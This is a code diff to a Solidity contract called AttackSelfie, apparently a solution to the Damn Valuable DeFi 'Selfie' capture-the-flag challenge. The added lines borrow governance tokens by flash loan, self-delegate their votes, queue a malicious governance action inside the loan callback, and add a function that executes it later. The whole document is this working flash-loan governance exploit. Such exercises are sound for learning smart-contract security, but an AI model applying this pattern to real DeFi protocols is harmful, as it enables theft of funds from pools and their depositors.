@@ -14,6 +14,7 @@ contract AttackSelfie {
     SelfiePool pool;
     SimpleGovernance governance;
     DamnValuableVotes damnValuableToken;
+    uint256 actionId;
     bytes32 CALL_BACK_SUCCESS = keccak256("ERC3156FlashBorrower.onFlashLoan");
 
     constructor(
@@ -34,7 +35,14 @@ contract AttackSelfie {
         bytes calldata data
     ) external returns(bytes32) {
         damnValuableToken.delegate(address(this));
-
+        
+        uint _actionId = governance.queueAction(
+            address(pool),
+            0,
+            data
+        );
+        actionId = _actionId;
+       
         IERC20(token).approve(address(pool), amount + fee);
         return CALL_BACK_SUCCESS;
     }
@@ -49,5 +57,10 @@ contract AttackSelfie {
             amountRequired,
             data
         );
+    }
+
+    function attackExecution() external returns (bool) {
+        bytes memory result = governance.executeAction(actionId);
+        return true;   
     } 
 } 
